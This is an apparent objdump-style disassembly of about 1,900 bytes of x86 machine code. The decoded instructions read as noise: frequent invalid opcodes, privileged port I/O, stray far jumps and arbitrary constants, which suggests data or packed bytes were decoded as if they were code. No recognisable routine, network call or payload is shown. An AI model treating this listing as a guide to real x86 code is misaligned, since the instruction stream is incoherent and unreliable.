  41d86a:	ins    BYTE PTR es:[edi],dx
  41d86b:	push   cs
  41d86c:	icebp  
  41d86d:	mov    DWORD PTR [esi+0x6d],esp
  41d870:	or     eax,0x2d1bcb26
  41d875:	clc    
  41d876:	in     al,0x1e
  41d878:	cmp    esi,DWORD PTR [esi+0x0]
  41d87b:	lods   al,BYTE PTR ds:[esi]
  41d87c:	or     ebx,DWORD PTR [eax-0x715e7037]
  41d882:	xor    eax,0x1ade5f7a
  41d887:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d888:	stos   BYTE PTR es:[edi],al
  41d889:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d88a:	mov    ds:0x79e63f7a,eax
  41d88f:	pop    esi
  41d890:	cmc    
  41d891:	(bad)  
  41d892:	cdq    
  41d893:	ss mov bh,0x77
  41d896:	lea    ebp,[esi]
  41d898:	push   ecx
  41d899:	push   esp
  41d89a:	jmp    0x4ac3:0x365992d0
  41d8a1:	cmp    al,0x78
  41d8a3:	push   ebx
  41d8a4:	dec    edx
  41d8a5:	sbb    DWORD PTR [ebp-0x5a9a30a2],edx
  41d8ab:	pop    ds
  41d8ac:	ja     0x41d902
  41d8ae:	inc    esi
  41d8af:	js     0x41d866
  41d8b1:	jno    0x41d839
  41d8b3:	push   cs
  41d8b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8b5:	test   al,0x4b
  41d8b7:	fbld   TBYTE PTR [esi-0x1abc20b8]
  41d8bd:	into   
  41d8be:	(bad)  
  41d8bf:	cmp    DWORD PTR [eax+0x3bb3479c],ecx
  41d8c5:	pop    ds
  41d8c6:	and    eax,DWORD PTR [edi]
  41d8c8:	std    
  41d8c9:	cwde   
  41d8ca:	inc    edi
  41d8cb:	sbb    eax,0x38e6aeec
  41d8d0:	loop   0x41d8ff
  41d8d2:	xor    ah,bl
  41d8d4:	dec    ebp
  41d8d5:	loop   0x41d8c3
  41d8d7:	mov    bh,0x40
  41d8d9:	pop    edi
  41d8da:	dec    ecx
  41d8db:	cmp    eax,0xa
  41d8de:	jle    0xb33fcfaa
  41d8e4:	xchg   DWORD PTR [edx+0x79],ebx
  41d8e7:	dec    eax
  41d8e8:	add    eax,0xc216f931
  41d8ed:	sub    al,BYTE PTR [ebx-0x4defba99]
  41d8f3:	sbb    al,0xf
  41d8f5:	test   al,0x9d
  41d8f7:	rcl    BYTE PTR [ecx+0x18],cl
  41d8fa:	je     0x41d8cb
  41d8fc:	repz adc al,0x2d
  41d8ff:	gs inc ecx
  41d901:	mov    bh,BYTE PTR [edi-0x5fee7d88]
  41d907:	xchg   ebp,edx
  41d909:	ins    DWORD PTR es:[edi],dx
  41d90a:	(bad)  
  41d90b:	data16 (bad) 
  41d90d:	mov    esi,0x889a6820
  41d912:	mov    dl,0xf4
  41d914:	xor    ah,BYTE PTR [edx+0x1c]
  41d917:	pushf  
  41d918:	adc    edx,DWORD PTR [edx]
  41d91a:	jno    0x41d943
  41d91c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d91d:	js     0x41d8a7
  41d91f:	xor    esi,DWORD PTR [esi+ecx*4+0x3918682b]
  41d926:	les    ecx,FWORD PTR [edi+0x9]
  41d929:	sub    ch,cl
  41d92b:	dec    ebx
  41d92c:	ret    0x9e3e
  41d92f:	pop    edx
  41d930:	sub    BYTE PTR [ebx+0x7e],bh
  41d933:	(bad)  
  41d934:	sbb    ebp,DWORD PTR [ebx]
  41d936:	jno    0x41d8e0
  41d938:	ins    DWORD PTR es:[edi],dx
  41d939:	add    ebx,DWORD PTR [edi+ecx*2]
  41d93c:	xlat   BYTE PTR ds:[ebx]
  41d93d:	es mov dh,0x73
  41d940:	imul   esi,DWORD PTR [edi+0x10eba94c],0x2cda02a6
  41d94a:	outs   dx,DWORD PTR ds:[esi]
  41d94b:	sar    DWORD PTR [ebp+0x2bf1bf5],cl
  41d951:	cmc    
  41d952:	push   ebx
  41d953:	adc    edi,ebx
  41d955:	fst    QWORD PTR [eax]
  41d957:	shl    eax,0x81
  41d95a:	mov    eax,0x5c094b2
  41d95f:	mov    bl,BYTE PTR [esi]
  41d961:	js     0x41d94d
  41d963:	adc    BYTE PTR [ecx],bh
  41d965:	daa    
  41d966:	call   0x9e3b974d
  41d96b:	clc    
  41d96c:	xchg   esp,eax
  41d96d:	les    eax,FWORD PTR [ebp+edx*4+0x50389f55]
  41d974:	stos   BYTE PTR es:[di],al
  41d976:	in     al,dx
  41d977:	sahf   
  41d978:	popa   
  41d979:	jmp    0xe6aa:0x85510268
  41d980:	inc    ecx
  41d981:	jmp    0x1851:0x65c37174
  41d988:	(bad)  
  41d989:	fwait
  41d98a:	leave  
  41d98b:	stc    
  41d98c:	pop    edx
  41d98d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d98e:	sbb    eax,0x31f476dc
  41d993:	cmp    DWORD PTR [edi-0x7a9f5804],0xffffffff
  41d99a:	dec    esp
  41d99b:	pushf  
  41d99c:	cmp    cl,BYTE PTR [esp+ecx*8+0x21f679f]
  41d9a3:	mov    DWORD PTR [ebx-0x2f7bb2c5],eax
  41d9a9:	inc    ecx
  41d9aa:	bound  edi,QWORD PTR [edx-0x24c3d306]
  41d9b0:	int    0x72
  41d9b2:	mov    eax,0xadd23f60
  41d9b7:	pop    edi
  41d9b8:	pop    ss
  41d9b9:	jb     0x41d9fb
  41d9bb:	mov    BYTE PTR [esi-0x1d8e051c],dh
  41d9c1:	jnp    0x41d9c1
  41d9c3:	jb     0x41d996
  41d9c5:	jmp    0xc67c:0xea84818c
  41d9cc:	inc    eax
  41d9cd:	cmc    
  41d9ce:	inc    BYTE PTR [ecx-0x60]
  41d9d1:	pop    ecx
  41d9d2:	mov    al,ds:0xaa7831ae
  41d9d7:	out    dx,eax
  41d9d8:	inc    esi
  41d9d9:	std    
  41d9da:	xchg   ebx,eax
  41d9db:	ja     0x41d9a9
  41d9dd:	js     0x41d96e
  41d9df:	(bad)  [ecx-0x70]
  41d9e2:	xchg   ebp,eax
  41d9e3:	sbb    ebp,edi
  41d9e5:	aaa    
  41d9e6:	sahf   
  41d9e7:	and    eax,0xa5d91a5c
  41d9ec:	ror    BYTE PTR [esi],cl
  41d9ee:	mov    eax,0x1ac4dd29
  41d9f3:	xchg   edx,eax
  41d9f4:	xor    ebx,DWORD PTR [esi]
  41d9f6:	ret    
  41d9f7:	hlt    
  41d9f8:	arpl   WORD PTR [esi-0x31],sp
  41d9fb:	jmp    0x5ff3:0x3487
  41da01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da02:	rep ins BYTE PTR es:[edi],dx
  41da04:	shl    BYTE PTR [edi],cl
  41da06:	sub    edx,DWORD PTR [ecx]
  41da08:	fmulp  st(2),st
  41da0a:	jle    0x41d99e
  41da0c:	mov    ds:0x7b6ef08a,eax
  41da11:	mov    ecx,ecx
  41da13:	and    esp,DWORD PTR [ebp-0x53]
  41da16:	and    DWORD PTR [esi-0x69e3869b],0x30976d24
  41da20:	jns    0x41da97
  41da22:	mov    ah,0x8a
  41da24:	addr16 pop eax
  41da26:	pop    esp
  41da27:	jns    0x41d9ce
  41da29:	mov    dl,BYTE PTR [ebp+0x265e3db0]
  41da2f:	sub    DWORD PTR [edx-0x5d],ebx
  41da32:	jecxz  0x41da24
  41da34:	rol    BYTE PTR [eax-0x4bbfc08a],1
  41da3a:	add    eax,ebx
  41da3c:	push   esi
  41da3d:	repnz aaa 
  41da3f:	pop    edi
  41da40:	sub    al,0xc3
  41da42:	ja     0x41d9f6
  41da44:	aam    0x5b
  41da46:	mov    ds:0xa4e74753,al
  41da4b:	enter  0x3262,0x43
  41da4f:	or     eax,0x138d9ac5
  41da54:	jecxz  0x41dab9
  41da56:	xchg   ebp,eax
  41da57:	add    esp,eax
  41da59:	sbb    ebx,ebx
  41da5b:	into   
  41da5c:	sub    DWORD PTR [esi-0x6a3d4a74],ecx
  41da62:	inc    ebx
  41da63:	mov    ds:0xad794e3a,eax
  41da68:	stos   DWORD PTR es:[edi],eax
  41da69:	js     0x41da38
  41da6b:	or     al,0x4f
  41da6d:	jno    0x41dac7
  41da6f:	sub    DWORD PTR [ebx-0x67],esp
  41da72:	sbb    al,BYTE PTR [eax]
  41da74:	xor    DWORD PTR [esi-0x25],ecx
  41da77:	dec    edx
  41da78:	call   0x9d1cc994
  41da7d:	inc    esp
  41da7e:	and    eax,0xd604358
  41da83:	pop    es
  41da84:	push   esi
  41da85:	mov    al,0x4b
  41da87:	cdq    
  41da88:	mov    bl,0xbd
  41da8a:	sbb    BYTE PTR [ebx-0x59c3cb2e],bl
  41da90:	jns    0x41da73
  41da92:	pop    ss
  41da93:	and    DWORD PTR [ebp-0x7c342845],esi
  41da99:	mov    ah,0x54
  41da9b:	int3   
  41da9c:	into   
  41da9d:	pop    edi
  41da9e:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41daa0:	pop    ecx
  41daa1:	jno    0x41da98
  41daa3:	imul   edx,DWORD PTR [ebx-0x6b],0xb0a35585
  41daaa:	fcmovnb st,st(0)
  41daac:	jg     0x41da56
  41daae:	lock mov al,0x88
  41dab1:	mov    bh,0xa8
  41dab3:	jl     0x41dae2
  41dab5:	jns    0x41dacb
  41dab7:	inc    edi
  41dab8:	ins    BYTE PTR es:[edi],dx
  41dab9:	mov    al,0xed
  41dabb:	icebp  
  41dabc:	icebp  
  41dabd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dabe:	pop    esp
  41dabf:	or     al,0x4c
  41dac1:	rol    DWORD PTR [esi-0x42],1
  41dac4:	(bad)
  41dac7:	sbb    al,0x4a
  41dac9:	test   BYTE PTR [ecx+0x10],ah
  41dacc:	lahf   
  41dacd:	icebp  
  41dace:	adc    BYTE PTR [eax-0x21abf3c3],ch
  41dad4:	outs   dx,BYTE PTR ds:[esi]
  41dad5:	sub    al,al
  41dad7:	inc    ecx
  41dad8:	daa    
  41dad9:	pop    ebp
  41dada:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dadb:	mov    eax,ds:0x1245413a
  41dae0:	xchg   esi,eax
  41dae1:	and    edx,edx
  41dae3:	cmp    cl,cl
  41dae5:	sub    eax,0xcdf604bb
  41daea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41daeb:	push   cs
  41daec:	call   0x727ed195
  41daf1:	jle    0x41dac1
  41daf3:	add    BYTE PTR [edi+0x9846aaa],dh
  41daf9:	mov    ch,0x7d
  41dafb:	mov    DWORD PTR [edi-0x7eb58b37],edx
  41db01:	jmp    0x41db47
  41db03:	stos   DWORD PTR es:[edi],eax
  41db04:	outs   dx,DWORD PTR ds:[esi]
  41db05:	add    edi,DWORD PTR [esi+0x2c]
  41db08:	pushf  
  41db09:	sbb    eax,0x2025a00e
  41db0e:	push   ebx
  41db0f:	mov    BYTE PTR [eax-0x2b],al
  41db12:	lds    edx,FWORD PTR [edx+0x41]
  41db15:	fstp   TBYTE PTR [edx-0x7a]
  41db18:	mov    ecx,0xd9a7565b
  41db1d:	les    ebp,FWORD PTR [edi+0x16]
  41db20:	sbb    BYTE PTR [ebx+0x1e5f5acc],dh
  41db26:	push   cs
  41db27:	cdq    
  41db28:	jle    0x41db94
  41db2a:	cvttps2pi mm5,QWORD PTR [ebx+ecx*4+0xd27e6ae]
  41db32:	sub    DWORD PTR [esi+0x21],edx
  41db35:	gs jo  0x41db41
  41db38:	loopne 0x41db91
  41db3a:	mov    ch,BYTE PTR es:[edi+0x50]
  41db3e:	dec    ecx
  41db3f:	or     al,0x65
  41db41:	adc    DWORD PTR [ecx],esp
  41db43:	push   cs
  41db44:	out    dx,al
  41db45:	mov    cl,0xee
  41db47:	leave  
  41db48:	mov    ebp,0x307fd89e
  41db4d:	loop   0x41db3b
  41db4f:	jne    0x41db5b
  41db51:	retf   0xb933
  41db54:	sti    
  41db55:	xchg   ecx,eax
  41db56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db57:	stos   BYTE PTR es:[edi],al
  41db58:	jbe    0x41dbc6
  41db5a:	jle    0x41dbbc
  41db5c:	push   0x3fe648ab
  41db61:	repnz arpl WORD PTR [ebx],bx
  41db64:	daa    
  41db65:	out    dx,eax
  41db66:	jp     0x41db6e
  41db68:	cmp    al,BYTE PTR [esi]
  41db6a:	jecxz  0x41dbc2
  41db6c:	cwde   
  41db6d:	cmp    eax,0xceb30842
  41db72:	or     esp,eax
  41db74:	cmp    al,0x56
  41db76:	ret    0x7407
  41db79:	std    
  41db7a:	nop
  41db7b:	jae    0x41db22
  41db7d:	and    BYTE PTR [ebp-0x48],cl
  41db80:	in     al,0x44
  41db82:	cmc    
  41db83:	ins    DWORD PTR es:[edi],dx
  41db84:	out    0x92,eax
  41db86:	enter  0xf0d9,0xe8
  41db8a:	fwait
  41db8b:	std    
  41db8c:	inc    edi
  41db8d:	adc    edi,DWORD PTR [ebp-0x4d]
  41db90:	cmp    ecx,0x52
  41db93:	into   
  41db94:	xchg   esi,eax
  41db95:	add    eax,0x4b0bea38
  41db9a:	cmp    esi,DWORD PTR [esi]
  41db9c:	push   0xffffffa0
  41db9e:	adc    DWORD PTR [esi],ecx
  41dba0:	jnp    0x41dbcd
  41dba2:	je     0x41dbd3
  41dba4:	pop    es
  41dba5:	or     dh,BYTE PTR [edi-0x4c]
  41dba8:	or     al,BYTE PTR [ecx+ecx*2+0x47]
  41dbac:	jmp    0x5fe62cd
  41dbb1:	cmp    DWORD PTR [eax-0xe378665],ebp
  41dbb7:	pop    edi
  41dbb8:	mov    esp,0x60c33c40
  41dbbd:	fnstsw WORD PTR [eax-0x3c9e6b0f]
  41dbc3:	cwde   
  41dbc4:	mov    bl,0x7f
  41dbc6:	mov    ch,0x72
  41dbc8:	ret    
  41dbc9:	mov    eax,ds:0x72d7cdf9
  41dbce:	sbb    edi,DWORD PTR [esi]
  41dbd0:	sub    al,0xcb
  41dbd2:	out    dx,eax
  41dbd3:	mov    ds:0xb1185b6a,al
  41dbd8:	add    al,0xc8
  41dbda:	call   0x12fb:0x8f1cfad1
  41dbe1:	add    dl,ch
  41dbe3:	test   eax,0x5fe6cc95
  41dbe8:	jmp    0x3567d2a7
  41dbed:	and    al,0x28
  41dbef:	ret    
  41dbf0:	sbb    BYTE PTR [ebp+eax*8+0x35],dl
  41dbf4:	imul   edi,DWORD PTR [edi+0x3],0xffffffaa
  41dbf8:	dec    esp
  41dbf9:	mov    ah,0x56
  41dbfb:	ins    DWORD PTR es:[edi],dx
  41dbfc:	icebp  
  41dbfd:	mov    ebp,0x987dc54
  41dc02:	inc    ebp
  41dc03:	pop    esi
  41dc04:	jno    0x41dc43
  41dc06:	add    al,0xf4
  41dc08:	push   esi
  41dc09:	or     eax,ebp
  41dc0b:	push   ecx
  41dc0c:	jmp    0x6d767b9a
  41dc11:	repnz push ebp
  41dc13:	aas    
  41dc14:	(bad)  
  41dc15:	mov    edi,0xb20449c8
  41dc1a:	sbb    DWORD PTR [ecx-0x4ff97f86],esp
  41dc20:	mov    ch,BYTE PTR [esi-0x6a]
  41dc23:	mov    esp,0xfc0de6b1
  41dc28:	addr16 aad 0xc9
  41dc2b:	scas   al,BYTE PTR es:[edi]
  41dc2c:	pop    ds
  41dc2d:	sub    eax,0x1bfe18a3
  41dc32:	xor    DWORD PTR [ebp+0x42],ecx
  41dc35:	adc    BYTE PTR [edx+0x1d],bh
  41dc38:	sbb    al,0x80
  41dc3a:	loope  0x41dc22
  41dc3c:	es jbe 0x41dc90
  41dc3f:	cmc    
  41dc40:	or     al,BYTE PTR ds:0xe032da5
  41dc46:	dec    ecx
  41dc47:	mov    edx,0x7a3dbd11
  41dc4c:	jmp    0x4f56:0x51630e36
  41dc53:	test   al,0xe2
  41dc55:	out    dx,eax
  41dc56:	gs jecxz 0x41dc32
  41dc59:	dec    esi
  41dc5a:	sahf   
  41dc5b:	push   edx
  41dc5c:	xchg   esi,eax
  41dc5d:	add    eax,0x5d8a92fc
  41dc62:	mov    ecx,DWORD PTR ds:0x65f09943
  41dc68:	popf   
  41dc69:	cli    
  41dc6a:	add    al,0xda
  41dc6c:	call   DWORD PTR ds:0xe9a023de
  41dc72:	shr    ebx,0xa4
  41dc75:	cmp    al,al
  41dc77:	pop    ebx
  41dc78:	into   
  41dc79:	sub    al,0x29
  41dc7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc7c:	adc    ecx,ebp
  41dc7e:	pop    edx
  41dc7f:	rol    DWORD PTR [edi+0x79],cl
  41dc82:	fild   WORD PTR [edi+ebx*2]
  41dc85:	adc    eax,0xc1f86441
  41dc8a:	push   ecx
  41dc8b:	dec    esp
  41dc8c:	mov    al,0x17
  41dc8e:	fnstcw WORD PTR [edi+0x19b69b2f]
  41dc94:	add    eax,0x5522be97
  41dc99:	(bad)  
  41dc9a:	and    al,0x68
  41dc9c:	lock mov ebp,0xecba393d
  41dca2:	int3   
  41dca3:	push   esp
  41dca4:	dec    esp
  41dca5:	jle    0x41dc45
  41dca7:	or     al,0x5b
  41dca9:	or     BYTE PTR [esp+ecx*2+0x34d08134],al
  41dcb0:	add    eax,DWORD PTR [edi+ecx*4]
  41dcb3:	fwait
  41dcb4:	rol    al,0x80
  41dcb7:	cmp    DWORD PTR [edi+ecx*2+0x2f85e09f],ebx
  41dcbe:	pop    ds
  41dcbf:	xchg   edi,eax
  41dcc0:	mov    eax,0xc508beee
  41dcc5:	jmp    0x41dd26
  41dcc7:	(bad)  
  41dcc8:	stos   BYTE PTR es:[edi],al
  41dcc9:	xor    al,BYTE PTR [esi]
  41dccb:	adc    DWORD PTR [edx-0x18fbc1f7],esi
  41dcd1:	fsubr  QWORD PTR ds:0xc0cc5a75
  41dcd7:	cmp    DWORD PTR [edx+0x71],ebx
  41dcda:	mov    gs,WORD PTR [ecx-0x546677c5]
  41dce0:	icebp  
  41dce1:	adc    dh,ah
  41dce3:	pushf  
  41dce4:	mov    ah,0x4a
  41dce6:	cdq    
  41dce7:	push   ebp
  41dce8:	push   edi
  41dce9:	add    al,0x2d
  41dceb:	ficomp WORD PTR [esp+ebx*4]
  41dcee:	or     al,0x81
  41dcf0:	loope  0x41dc7d
  41dcf2:	and    eax,0x36a4d7e3
  41dcf7:	aad    0x96
  41dcf9:	and    edi,ebp
  41dcfb:	daa    
  41dcfc:	mov    ch,0x98
  41dcfe:	mov    es,WORD PTR [edi-0x4]
  41dd01:	fisubr DWORD PTR [esi]
  41dd03:	cmp    eax,0x3439fe3
  41dd08:	and    edx,esp
  41dd0a:	repz adc BYTE PTR [esi+0x17de70e9],0x16
  41dd12:	repnz out dx,eax
  41dd14:	xchg   edi,eax
  41dd15:	jge    0x41dd5e
  41dd17:	sbb    BYTE PTR [ebx+0x14379bba],ch
  41dd1d:	xor    esp,esi
  41dd1f:	repz fbstp TBYTE PTR [ecx]
  41dd22:	ja     0x41dd3e
  41dd24:	inc    ebx
  41dd25:	mov    ds:0x1f30ec5e,eax
  41dd2a:	xchg   bh,bl
  41dd2c:	mov    cl,0x20
  41dd2e:	push   edx
  41dd2f:	mov    BYTE PTR [eax+esi*2],bl
  41dd32:	popa   
  41dd33:	push   0x4a37fb30
  41dd38:	lock lods eax,DWORD PTR ds:[esi]
  41dd3a:	xor    al,0x41
  41dd3c:	push   edi
  41dd3d:	xchg   edx,eax
  41dd3e:	fldcw  WORD PTR [ebp-0x754d5f2f]
  41dd44:	or     edi,DWORD PTR [ecx-0x51223213]
  41dd4a:	pop    eax
  41dd4b:	fld    QWORD PTR [ecx]
  41dd4d:	adc    esp,DWORD PTR [edi]
  41dd4f:	or     edi,edi
  41dd51:	inc    ebp
  41dd52:	(bad)  
  41dd53:	push   ebx
  41dd54:	jns    0x41ddaa
  41dd56:	loopne 0x41dd8c
  41dd58:	in     al,dx
  41dd59:	iret   
  41dd5a:	iret   
  41dd5b:	into   
  41dd5c:	sar    BYTE PTR [eax+ecx*2],cl
  41dd5f:	cmp    DWORD PTR [ecx+0x509f4af4],esi
  41dd65:	je     0x41dd19
  41dd67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd68:	sbb    eax,0xae285daa
  41dd6d:	mov    dh,0xc7
  41dd6f:	sbb    esi,DWORD PTR ds:0xd8f60e03
  41dd75:	mov    al,0x19
  41dd77:	dec    esp
  41dd78:	scas   al,BYTE PTR es:[edi]
  41dd79:	add    al,0x42
  41dd7b:	ds leave 
  41dd7d:	pop    edx
  41dd7e:	repz enter 0x622f,0x77
  41dd83:	pop    edi
  41dd84:	pusha  
  41dd85:	ins    BYTE PTR es:[edi],dx
  41dd86:	imul   eax,edi,0x35
  41dd89:	add    esp,DWORD PTR [edx+0x5e]
  41dd8c:	shl    ch,cl
  41dd8e:	call   0xdbbc0cad
  41dd93:	sub    esi,ecx
  41dd95:	cwde   
  41dd96:	mov    ebx,0xb3646902
  41dd9b:	add    edx,DWORD PTR [esi+ebx*2-0x56]
  41dd9f:	pusha  
  41dda0:	icebp  
  41dda1:	pop    ss
  41dda2:	bound  edi,QWORD PTR [edi+0x24]
  41dda5:	outs   dx,BYTE PTR ds:[esi]
  41dda6:	pop    edi
  41dda7:	adc    cl,BYTE PTR [ecx+0x40]
  41ddaa:	enter  0x9e8d,0x7
  41ddae:	push   esi
  41ddaf:	fcom   QWORD PTR ds:0x9ee2c266
  41ddb5:	scas   eax,DWORD PTR es:[edi]
  41ddb6:	jbe    0x41ddd2
  41ddb8:	dec    edi
  41ddb9:	sub    ebx,DWORD PTR [ebx-0x2]
  41ddbc:	fcomp  QWORD PTR [eax-0xc]
  41ddbf:	stos   DWORD PTR es:[edi],eax
  41ddc0:	jne    0x41de2b
  41ddc2:	in     eax,dx
  41ddc3:	icebp  
  41ddc4:	into   
  41ddc5:	jbe    0x41dd80
  41ddc7:	mov    edx,0x1da86373
  41ddcc:	sbb    dh,BYTE PTR [ecx+0x274f15e5]
  41ddd2:	ror    BYTE PTR [ebx+eiz*4+0x5f04335a],cl
  41ddd9:	pop    esi
  41ddda:	sbb    DWORD PTR [ebx-0x3763de22],ebp
  41dde0:	mov    ch,0xdc
  41dde2:	test   bl,ch
  41dde4:	les    ebp,FWORD PTR [esi-0x38]
  41dde7:	ds push esi
  41dde9:	popfw  
  41ddeb:	ins    BYTE PTR es:[edi],dx
  41ddec:	jns    0x41de6c
  41ddee:	push   es
  41ddef:	or     bl,BYTE PTR [edi+0x4047457c]
  41ddf5:	outs   dx,BYTE PTR ds:[esi]
  41ddf6:	jb     0x41de6e
  41ddf8:	stos   BYTE PTR es:[edi],al
  41ddf9:	scas   eax,DWORD PTR es:[edi]
  41ddfa:	scas   al,BYTE PTR es:[edi]
  41ddfb:	arpl   dx,di
  41ddfd:	push   0x766e4077
  41de02:	mov    edx,ebp
  41de04:	add    ecx,DWORD PTR [ebx-0x34]
  41de07:	xor    al,0x12
  41de09:	push   ebp
  41de0a:	push   0x393d99e3
  41de0f:	sbb    al,0xeb
  41de11:	xchg   ebp,eax
  41de12:	in     eax,0x5c
  41de14:	repnz data16 faddp st(5),st
  41de18:	dec    edi
  41de19:	(bad)
  41de1c:	icebp  
  41de1d:	mov    edx,DWORD PTR [eax+0x6d]
  41de20:	test   al,0x3f
  41de22:	sub    cl,BYTE PTR [ebp-0x71888e15]
  41de28:	(bad)  [edi-0x34]
  41de2b:	ret    
  41de2c:	fs dec esi
  41de2e:	loop   0x41de47
  41de30:	(bad)  
  41de31:	jmp    0xa91fe275
  41de36:	xlat   BYTE PTR ds:[ebx]
  41de37:	pop    ss
  41de38:	push   ebx
  41de39:	add    al,0xc7
  41de3b:	(bad)  
  41de3c:	and    eax,0xee64c702
  41de41:	ja     0x41de58
  41de43:	aam    0x21
  41de45:	or     eax,0xfc0e5e90
  41de4a:	lahf   
  41de4b:	rcr    BYTE PTR [edi+0x1488abe0],1
  41de51:	test   ecx,esp
  41de53:	adc    eax,0x58bcb440
  41de58:	mov    bh,0xc2
  41de5a:	out    dx,al
  41de5b:	or     eax,0x99407163
  41de60:	gs out dx,al
  41de62:	sbb    esp,esi
  41de64:	bound  esp,QWORD PTR [ebp-0x69]
  41de67:	sub    al,0x50
  41de69:	retf   0xb24e
  41de6c:	adc    BYTE PTR [ebp+0x15],cl
  41de6f:	ins    DWORD PTR es:[edi],dx
  41de70:	jne    0x41dedd
  41de72:	mov    edi,DWORD PTR [edi+0x6a]
  41de75:	jmp    0x4a0e:0x7aaf4c40
  41de7c:	mov    bh,0x12
  41de7e:	ins    BYTE PTR es:[edi],dx
  41de7f:	sbb    ch,BYTE PTR [edi-0x3a168089]
  41de85:	dec    ebp
  41de86:	xor    ecx,DWORD PTR es:[ecx+0x3d201d00]
  41de8d:	or     al,0x7e
  41de8f:	stos   BYTE PTR es:[edi],al
  41de90:	das    
  41de91:	push   ds
  41de92:	les    ebp,FWORD PTR ds:0xaf122a3b
  41de99:	int    0x98
  41de9b:	(bad)  [esi+edx*4]
  41de9e:	sar    DWORD PTR [edx-0x3],1
  41dea1:	mov    esi,0x55b244b7
  41dea6:	push   0x32
  41dea8:	pop    ss
  41dea9:	sbb    dl,BYTE PTR [edx-0x144bb790]
  41deaf:	dec    ecx
  41deb0:	lahf   
  41deb1:	ficom  WORD PTR cs:[ecx-0x38b10c2f]
  41deb8:	jle    0x41de4d
  41deba:	inc    ebp
  41debb:	call   0x6a0e:0x3579add1
  41dec2:	(bad)  
  41dec4:	jbe    0x41def0
  41dec6:	or     BYTE PTR [ecx],cl
  41dec8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dec9:	add    DWORD PTR [ecx+0x62],ebp
  41decc:	jns    0x41de88
  41dece:	adc    esp,edi
  41ded0:	aad    0x7
  41ded2:	cmp    cl,dl
  41ded4:	addr16 pushf 
  41ded6:	push   edi
  41ded7:	ror    BYTE PTR [edx],cl
  41ded9:	jae    0x41de81
  41dedb:	sbb    BYTE PTR [edi-0x63],al
  41dede:	jbe    0x41deae
  41dee0:	inc    eax
  41dee1:	fcomp  QWORD PTR [ebp-0x6c4fd79a]
  41dee7:	fwait
  41dee8:	cmp    cl,BYTE PTR [ebx+0x7014797]
  41deee:	imul   ebp,DWORD PTR [esi],0xffffffe5
  41def1:	or     DWORD PTR [ebx+ebp*2+0x10],esp
  41def5:	sbb    edx,0x1ceb696b
  41defb:	push   ecx
  41defc:	fucom  st(2)
  41defe:	mov    eax,0xc62765fe
  41df03:	ins    DWORD PTR es:[edi],dx
  41df04:	sti    
  41df05:	xchg   esi,eax
  41df06:	mov    ah,0x1c
  41df08:	cmp    DWORD PTR [eax+0x21],eax
  41df0b:	add    ebx,esi
  41df0d:	mov    ch,0xa7
  41df0f:	arpl   dx,ax
  41df11:	test   DWORD PTR [edi-0x3e],esp
  41df14:	or     eax,0x57cbd622
  41df19:	dec    edi
  41df1a:	xchg   edi,eax
  41df1b:	sar    ch,1
  41df1d:	pop    edx
  41df1e:	jns    0x41decd
  41df20:	push   0xffffffcf
  41df22:	outs   dx,DWORD PTR ds:[esi]
  41df23:	push   ebp
  41df24:	addr16 push es
  41df26:	dec    ebp
  41df27:	test   ah,cl
  41df29:	and    eax,0x3beff355
  41df2e:	fimul  WORD PTR [ecx+0x45a70569]
  41df34:	pop    edi
  41df35:	leave  
  41df36:	mov    al,0xd
  41df38:	push   esp
  41df39:	add    dh,dl
  41df3b:	adc    eax,0x5f382288
  41df40:	pop    es
  41df41:	adc    al,BYTE PTR [ecx+0xd9babfb]
  41df47:	mov    edi,0x9ac1676d
  41df4c:	fstp   st(6)
  41df4e:	es push ds
  41df50:	call   0xba78:0x52a59c42
  41df57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df58:	pop    esi
  41df59:	lea    eax,[edi-0x7d]
  41df5c:	sbb    esp,DWORD PTR ds:[eax-0x60b077c4]
  41df63:	cmc    
  41df64:	inc    ecx
  41df65:	push   ss
  41df66:	cmp    bh,BYTE PTR [ecx-0x7d5cefed]
  41df6c:	cwde   
  41df6d:	daa    
  41df6e:	mov    ebx,0x8bce4516
  41df73:	mov    bl,0xc7
  41df75:	clc    
  41df76:	pop    ecx
  41df77:	int3   
  41df78:	mov    dh,0x76
  41df7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df7c:	retf   
  41df7d:	retf   
  41df7e:	outs   dx,DWORD PTR ds:[esi]
  41df7f:	imul   edx,DWORD PTR [ebp-0x151ddeea],0xd0fd9215
  41df89:	push   edx
  41df8a:	cmc    
  41df8b:	pusha  
  41df8c:	das    
  41df8d:	mov    BYTE PTR [edx-0x163705b2],ah
  41df93:	inc    edi
  41df94:	shl    DWORD PTR [ecx],1
  41df96:	add    al,0x23
  41df99:	shl    DWORD PTR [edx+edi*1-0x42cd89ec],0x6c
  41dfa1:	mov    esi,0x32a23422
  41dfa6:	aam    0xbe
  41dfa8:	repnz cmp al,0x35
  41dfab:	add    DWORD PTR [esi+0x5f],edx
  41dfae:	addr16 fwait
  41dfb0:	mov    ds:0xc350030f,eax
  41dfb5:	dec    ecx
  41dfb6:	xor    eax,0x549ec68d
  41dfbb:	jge    0x41e00a
  41dfbd:	push   esp
  41dfbe:	in     al,dx
  41dfbf:	or     eax,DWORD PTR [esp+ebp*1]
  41dfc2:	call   0x2c29068c
  41dfc7:	jge    0x41df9e
  41dfc9:	aad    0x75
  41dfcb:	jmp    0xaf0b623f
  41dfd0:	ds (bad) 
  41dfd2:	adc    al,0x36
  41dfd4:	mov    DWORD PTR [ebx+ecx*4-0x6c],esi
  41dfd8:	ins    DWORD PTR es:[edi],dx
  41dfd9:	(bad)  
  41dfda:	hlt    
